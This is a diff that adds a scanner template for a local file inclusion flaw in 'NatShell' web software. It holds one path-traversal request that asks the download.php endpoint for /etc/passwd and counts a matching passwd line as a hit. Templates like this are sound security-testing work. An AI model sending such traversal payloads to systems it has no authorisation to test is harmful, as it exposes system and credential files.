@@ -1,0 +1,21 @@
+id: natshell-path-traversal
+name: NatShell - Local File Inclusion
+severity: high
+confidence: tentative
+description: NatShell is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- natshell
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /download.php?file=../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - toor:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
